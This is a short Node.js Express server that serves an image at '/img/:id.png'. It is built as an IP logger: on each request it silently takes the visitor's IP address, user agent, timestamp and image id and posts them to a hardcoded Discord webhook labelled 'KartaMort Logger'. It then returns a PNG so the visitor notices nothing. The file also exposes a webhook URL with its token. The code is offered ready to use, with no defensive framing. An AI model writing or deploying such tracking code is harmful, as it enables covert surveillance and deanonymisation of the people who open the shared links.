const express = require('express');
const fs = require('fs');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

const app = express();
const PORT = process.env.PORT || 3000;

app.get('/img/:id.png', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const id = req.params.id;
  const date = new Date().toISOString();

  const payload = {
    username: "🃏 KartaMort Logger",
    content: `🎴 Visión registrada\n\n📍 IP: \`${ip}\`\n🧾 Agente: \`${userAgent}\`\n🕰️ Fecha: \`${date}\`\n🧿 Código: \`${id}\``
  };

  fetch("https://discord.com/api/webhooks/1360813090098122913/BW90Lv2Z2rKvNKl5fCChCECvJbtgwoamIVKfh7CYlACRnHDjKtICaU_KVA-93D_9efiI", {
    method: "POST",
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  }).catch(err => console.error("Error enviando webhook", err));

  const image = fs.readFileSync('./kartamort.png');
  res.setHeader('Content-Type', 'image/png');
  res.send(image);
});

app.listen(PORT, () => {
  console.log(`Servidor escuchando en el puerto ${PORT}`);
});
